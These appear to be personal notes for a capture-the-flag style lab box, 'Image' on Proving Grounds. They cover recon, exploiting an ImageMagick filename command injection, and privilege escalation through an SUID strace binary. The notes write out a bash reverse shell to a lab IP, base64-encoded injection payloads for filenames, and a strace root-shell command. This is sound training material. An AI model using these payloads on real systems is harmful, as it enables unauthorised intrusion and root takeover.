# NMAP

```
sudo nmap -sC -sV -p- 192.168.236.178 -oN nmap-image
```


# 80 

![[PG/Linux/attachments/Pasted image 20250711142152.png]]

- immediately think this may be a magic bytes thing

![[PG/Linux/attachments/Pasted image 20250711142426.png]]
## Ferox 

```
feroxbuster -u http://192.168.236.178/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o ferox.out
```
![[PG/Linux/attachments/Pasted image 20250711144116.png]]

## Upload a web shell

![[PG/Linux/attachments/Pasted image 20250711142454.png]]

Look like that uploaded 

![[PG/Linux/attachments/Pasted image 20250711142518.png]]
- version 6.9-6-4?

Where is it 

![[PG/Linux/attachments/Pasted image 20250711142610.png]]


![[PG/Linux/attachments/Pasted image 20250711142621.png]]

Googling "ImageMagick Identifier exploit"

[Found one](https://github.com/ImageMagick/ImageMagick/issues/6339) for version 6.9-6-4

So if the filename has back ticks- the application won't sanitize?

I think I need to do this with Burp.

![[PG/Linux/attachments/Pasted image 20250711143539.png]]
Hmmm apparently the pipe was supposed to work. not backtick.

Intercept upload with Burp

![[PG/Linux/attachments/Pasted image 20250711143558.png]]

Send to repeater

Add a backtick in the filename 

![[PG/Linux/attachments/Pasted image 20250711143646.png]]

- It uploaded but I couldn't navigate to it

![[PG/Linux/attachments/Pasted image 20250711144032.png]]

Added backticks around the filename and do actually get a response 

![[PG/Linux/attachments/Pasted image 20250711143857.png]]

Change extension to PNG - nope

I misinterpreted the exploit. The pipe character is the one that will allow code execution.

Cheating with this writeup..This as the image name should work

```
cp cat.jpg ’|smile”`echo <base64_bash_reverse_shell> | base64 -d | bash`”.jpg’
```

**Bash Reverse Shell**
```
bash -i >& /dev/tcp/192.168.45.152/9001 0>&1
```

**Base64 Encode**
```
echo -n "bash -i >& /dev/tcp/192.168.45.152/9001 0>&1" | base64
```

Remove weird chars (=,+)

Resulting payload

```
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC40NS4xNTIvOTAwMSAgICAwPiYx
```

![[PG/Linux/attachments/Pasted image 20250711145855.png]]

Trying this..

```
|cat”`echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC40NS4xNTIvOTAwMSAgICAwPiYx| base64 -d | bash`”.png’
```

Not sure if I need a cat.jpg or something

![[PG/Linux/attachments/Pasted image 20250711145428.png]]

I'll reupload and intercept req

![[PG/Linux/attachments/Pasted image 20250711145538.png]]

This didn't work

![[PG/Linux/attachments/Pasted image 20250711145655.png]]

Okay, I'm going to use this https://github.com/overgrowncarrot1/ImageTragick_CVE-2023-34152?source=post_page-----47a18735fa20---------------------------------------

This video helps. Maybe I can't modify the file name in Burp..

![[PG/Linux/attachments/Pasted image 20250711150441.png]]

![[PG/Linux/attachments/Pasted image 20250711150452.png]]

![[PG/Linux/attachments/Pasted image 20250711150826.png]]

![[PG/Linux/attachments/Pasted image 20250711150846.png]]


Wait.

I think renaming it through Burp was fine after all???

![[PG/Linux/attachments/Pasted image 20250711150942.png]]
Did I reverse shell myself? lol

![[PG/Linux/attachments/Pasted image 20250711151026.png]]

Not working.

I'm using this exploit https://github.com/overgrowncarrot1/ImageTragick_CVE-2023-34152/blob/main/CVE-2023-34152.py

This will create the image file.





# Privesc is an SUID

![[PG/Linux/attachments/Pasted image 20250711151232.png]]

![[PG/Linux/attachments/Pasted image 20250711151253.png]]

This file generation exploit worked

![[PG/Linux/attachments/Pasted image 20250711152400.png]]

![[PG/Linux/attachments/Pasted image 20250711152508.png]]

# Privesc

```
/usr/bin/strace -o /dev/null /bin/sh -p
```

![[PG/Linux/attachments/Pasted image 20250711152701.png]]

Resources:

https://medium.com/@robertip/oscp-practice-image-proving-ground-practice-47a18735fa20

